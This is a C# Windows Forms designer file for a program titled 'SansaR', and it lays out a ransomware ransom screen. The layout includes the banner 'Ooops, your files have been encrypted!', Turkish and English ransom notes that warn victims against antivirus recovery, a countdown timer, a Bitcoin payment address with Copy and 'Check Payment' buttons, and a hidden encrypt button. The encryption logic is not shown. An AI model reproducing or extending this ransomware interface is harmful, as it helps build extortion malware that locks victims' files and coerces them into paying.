namespace FileEncryptionApp
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.txtPassword = new System.Windows.Forms.TextBox();
            this.btnEncrypt = new System.Windows.Forms.Button();
            this.btnDecrypt = new System.Windows.Forms.Button();
            this.progressBar = new System.Windows.Forms.ProgressBar();
            this.timerCountdown = new System.Windows.Forms.Timer(this.components);
            this.listBox1 = new System.Windows.Forms.ListBox();
            this.label1 = new System.Windows.Forms.Label();
            this.labelCountdown = new System.Windows.Forms.Label();
            this.btcListBox = new System.Windows.Forms.ListBox();
            this.cpyButton = new System.Windows.Forms.Button();
            this.paymentButton = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
            this.linkLabel2 = new System.Windows.Forms.LinkLabel();
            this.panel1 = new System.Windows.Forms.Panel();
            this.pictureBoxWallpaper = new System.Windows.Forms.PictureBox();
            this.panel2 = new System.Windows.Forms.Panel();
            this.listBox2 = new System.Windows.Forms.ListBox();
            this.panel3 = new System.Windows.Forms.Panel();
            this.btcPictureBox = new System.Windows.Forms.PictureBox();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxWallpaper)).BeginInit();
            this.panel2.SuspendLayout();
            this.panel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.btcPictureBox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // txtPassword
            // 
            this.txtPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.txtPassword.Location = new System.Drawing.Point(33, 65);
            this.txtPassword.Name = "txtPassword";
            this.txtPassword.Size = new System.Drawing.Size(675, 30);
            this.txtPassword.TabIndex = 0;
            this.txtPassword.UseSystemPasswordChar = true;
            // 
            // btnEncrypt
            // 
            this.btnEncrypt.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.btnEncrypt.Location = new System.Drawing.Point(1238, 12);
            this.btnEncrypt.Name = "btnEncrypt";
            this.btnEncrypt.Size = new System.Drawing.Size(10, 11);
            this.btnEncrypt.TabIndex = 1;
            this.btnEncrypt.Text = "Şifrele";
            this.btnEncrypt.UseVisualStyleBackColor = true;
            this.btnEncrypt.Visible = false;
            this.btnEncrypt.Click += new System.EventHandler(this.btnEncrypt_Click);
            // 
            // btnDecrypt
            // 
            this.btnDecrypt.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.btnDecrypt.Location = new System.Drawing.Point(423, 102);
            this.btnDecrypt.Name = "btnDecrypt";
            this.btnDecrypt.Size = new System.Drawing.Size(228, 39);
            this.btnDecrypt.TabIndex = 2;
            this.btnDecrypt.Text = "Decrypt";
            this.btnDecrypt.UseVisualStyleBackColor = true;
            this.btnDecrypt.Click += new System.EventHandler(this.btnDecrypt_Click);
            // 
            // progressBar
            // 
            this.progressBar.Location = new System.Drawing.Point(96, 161);
            this.progressBar.Name = "progressBar";
            this.progressBar.Size = new System.Drawing.Size(555, 27);
            this.progressBar.Step = 5;
            this.progressBar.TabIndex = 3;
            this.progressBar.Visible = false;
            // 
            // timerCountdown
            // 
            this.timerCountdown.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // listBox1
            // 
            this.listBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.listBox1.FormattingEnabled = true;
            this.listBox1.ItemHeight = 20;
            this.listBox1.Items.AddRange(new object[] {
            "Tüm dosyalarınız şifrelenmiştir!",
            "",
            "Aşağıdaki dosyalarınıza erişim sağlayamazsınız:",
            "- Belgeler",
            "- Resimler",
            "- Videolar",
            "- Müzik",
            "- Sunumlar",
            "- Veritabanları",
            "",
            "Şifreleme işlemi tamamlandı ve dosyalarınız artık erişilemez durumda. Şifrelerini" +
                "zi geri almak için belirtilen adımları takip etmeniz gerekmektedir.",
            "",
            "Lütfen dikkat edin:",
            "1. Hiçbir şekilde dosyalarınızı silmeyin.",
            "2. Antivirüs veya başka yazılımlar kullanarak dosyalarınızı kurtarmaya çalışmayın" +
                ".",
            "3. Aksi takdirde, dosyalarınız kalıcı olarak silinebilir.",
            "",
            "Geri yükleme için talimatları almak için belirli bir süre içinde bizimle iletişim" +
                "e geçmeniz gerekmektedir. Aksi takdirde dosyalarınız kalıcı olarak kaybolabilir!" +
                "",
            "",
            "Unutmayın: Zaman, sizin için kritik bir öneme sahiptir!"});
            this.listBox1.Location = new System.Drawing.Point(34, 15);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(675, 344);
            this.listBox1.TabIndex = 4;
            this.listBox1.SelectedIndexChanged += new System.EventHandler(this.listBox1_SelectedIndexChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 16.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label1.Location = new System.Drawing.Point(419, 5);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(545, 32);
            this.label1.TabIndex = 5;
            this.label1.Text = "Ooops, your files have been encrypted!";
            // 
            // labelCountdown
            // 
            this.labelCountdown.AutoSize = true;
            this.labelCountdown.Font = new System.Drawing.Font("Microsoft Sans Serif", 36F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.labelCountdown.Location = new System.Drawing.Point(18, 74);
            this.labelCountdown.Name = "labelCountdown";
            this.labelCountdown.Size = new System.Drawing.Size(262, 69);
            this.labelCountdown.TabIndex = 6;
            this.labelCountdown.Text = "00:00:00";
            // 
            // btcListBox
            // 
            this.btcListBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.btcListBox.FormattingEnabled = true;
            this.btcListBox.ItemHeight = 25;
            this.btcListBox.Items.AddRange(new object[] {
            "1A1zS2eP2QGefi5TRETfTL5SLmv5DivfNa"});
            this.btcListBox.Location = new System.Drawing.Point(192, 21);
            this.btcListBox.Name = "btcListBox";
            this.btcListBox.Size = new System.Drawing.Size(397, 29);
            this.btcListBox.TabIndex = 10;
            // 
            // cpyButton
            // 
            this.cpyButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.cpyButton.Location = new System.Drawing.Point(595, 16);
            this.cpyButton.Name = "cpyButton";
            this.cpyButton.Size = new System.Drawing.Size(113, 39);
            this.cpyButton.TabIndex = 11;
            this.cpyButton.Text = "Copy";
            this.cpyButton.UseVisualStyleBackColor = true;
            this.cpyButton.Click += new System.EventHandler(this.cpyButton_Click);
            // 
            // paymentButton
            // 
            this.paymentButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.paymentButton.Location = new System.Drawing.Point(96, 102);
            this.paymentButton.Name = "paymentButton";
            this.paymentButton.Size = new System.Drawing.Size(228, 39);
            this.paymentButton.TabIndex = 12;
            this.paymentButton.Text = "Check Payment";
            this.paymentButton.UseVisualStyleBackColor = true;
            this.paymentButton.Click += new System.EventHandler(this.paymentButton_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Yellow;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 13.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label2.Location = new System.Drawing.Point(10, 33);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(267, 29);
            this.label2.TabIndex = 7;
            this.label2.Text = "Your files will be lost on";
            // 
            // linkLabel1
            // 
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.linkLabel1.Location = new System.Drawing.Point(67, 598);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new System.Drawing.Size(109, 25);
            this.linkLabel1.TabIndex = 14;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "Contact Us";
            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
            // 
            // linkLabel2
            // 
            this.linkLabel2.AutoSize = true;
            this.linkLabel2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.linkLabel2.Location = new System.Drawing.Point(67, 554);
            this.linkLabel2.Name = "linkLabel2";
            this.linkLabel2.Size = new System.Drawing.Size(127, 25);
            this.linkLabel2.TabIndex = 15;
            this.linkLabel2.TabStop = true;
            this.linkLabel2.Text = "About Bitcoin";
            this.linkLabel2.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel2_LinkClicked);
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.labelCountdown);
            this.panel1.Controls.Add(this.pictureBoxWallpaper);
            this.panel1.Location = new System.Drawing.Point(42, 222);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(296, 307);
            this.panel1.TabIndex = 16;
            // 
            // pictureBoxWallpaper
            // 
            this.pictureBoxWallpaper.Image = global::FileEncryptionApp.Properties.Resources.lock4;
            this.pictureBoxWallpaper.Location = new System.Drawing.Point(70, 165);
            this.pictureBoxWallpaper.Name = "pictureBoxWallpaper";
            this.pictureBoxWallpaper.Size = new System.Drawing.Size(146, 122);
            this.pictureBoxWallpaper.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBoxWallpaper.TabIndex = 7;
            this.pictureBoxWallpaper.TabStop = false;
            // 
            // panel2
            // 
            this.panel2.Controls.Add(this.listBox2);
            this.panel2.Controls.Add(this.listBox1);
            this.panel2.Location = new System.Drawing.Point(375, 40);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(751, 392);
            this.panel2.TabIndex = 17;
            // 
            // listBox2
            // 
            this.listBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.listBox2.FormattingEnabled = true;
            this.listBox2.ItemHeight = 20;
            this.listBox2.Items.AddRange(new object[] {
            "All your files have been encrypted!",
            "",
            "You cannot access the following files:",
            "",
            "    Documents",
            "    Pictures",
            "    Videos",
            "    Music",
            "    Presentations",
            "    Databases",
            "",
            "The encryption process is complete, and your files are now inaccessible. You need" +
                " to follow the specified steps to retrieve your passwords.",
            "",
            "Please pay attention to the following:",
            "",
            "    Do not delete your files under any circumstances.",
            "    Do not attempt to recover your files using antivirus or other software.",
            "    Otherwise, your files may be permanently deleted.",
            "",
            "You need to contact us within a certain period to receive instructions for recove" +
                "ry. Otherwise, your files may be permanently lost!",
            "",
            "Remember: Time is of critical importance for you!"});
            this.listBox2.Location = new System.Drawing.Point(34, 15);
            this.listBox2.Name = "listBox2";
            this.listBox2.Size = new System.Drawing.Size(675, 344);
            this.listBox2.TabIndex = 5;
            // 
            // panel3
            // 
            this.panel3.Controls.Add(this.btcPictureBox);
            this.panel3.Controls.Add(this.progressBar);
            this.panel3.Controls.Add(this.txtPassword);
            this.panel3.Controls.Add(this.btnDecrypt);
            this.panel3.Controls.Add(this.btcListBox);
            this.panel3.Controls.Add(this.paymentButton);
            this.panel3.Controls.Add(this.cpyButton);
            this.panel3.Location = new System.Drawing.Point(375, 417);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(751, 206);
            this.panel3.TabIndex = 18;
            // 
            // btcPictureBox
            // 
            this.btcPictureBox.Image = global::FileEncryptionApp.Properties.Resources.btc2;
            this.btcPictureBox.Location = new System.Drawing.Point(33, 11);
            this.btcPictureBox.Name = "btcPictureBox";
            this.btcPictureBox.Size = new System.Drawing.Size(142, 48);
            this.btcPictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.btcPictureBox.TabIndex = 8;
            this.btcPictureBox.TabStop = false;
            // 
            // comboBox1
            // 
            this.comboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[] {
            "Türkçe",
            "İngilizce"});
            this.comboBox1.Location = new System.Drawing.Point(987, 5);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(121, 33);
            this.comboBox1.TabIndex = 19;
            this.comboBox1.Text = "Türkçe";
            this.comboBox1.SelectedIndexChanged += new System.EventHandler(this.comboBox1_SelectedIndexChanged);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::FileEncryptionApp.Properties.Resources.skull;
            this.pictureBox1.Location = new System.Drawing.Point(42, 40);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(296, 199);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 20;
            this.pictureBox1.TabStop = false;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Brown;
            this.ClientSize = new System.Drawing.Size(1153, 629);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.comboBox1);
            this.Controls.Add(this.panel3);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.linkLabel2);
            this.Controls.Add(this.linkLabel1);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.btnEncrypt);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Form1";
            this.Text = "SansaR";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxWallpaper)).EndInit();
            this.panel2.ResumeLayout(false);
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.btcPictureBox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox txtPassword;
        private System.Windows.Forms.Button btnEncrypt;
        private System.Windows.Forms.Button btnDecrypt;
        private System.Windows.Forms.ProgressBar progressBar;
        private System.Windows.Forms.Timer timerCountdown;
        private System.Windows.Forms.ListBox listBox1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label labelCountdown;
        private System.Windows.Forms.PictureBox pictureBoxWallpaper;
        private System.Windows.Forms.PictureBox btcPictureBox;
        private System.Windows.Forms.ListBox btcListBox;
        private System.Windows.Forms.Button cpyButton;
        private System.Windows.Forms.Button paymentButton;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.LinkLabel linkLabel1;
        private System.Windows.Forms.LinkLabel linkLabel2;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Panel panel3;
        private System.Windows.Forms.ListBox listBox2;
        private System.Windows.Forms.ComboBox comboBox1;
        private System.Windows.Forms.PictureBox pictureBox1;
    }
}

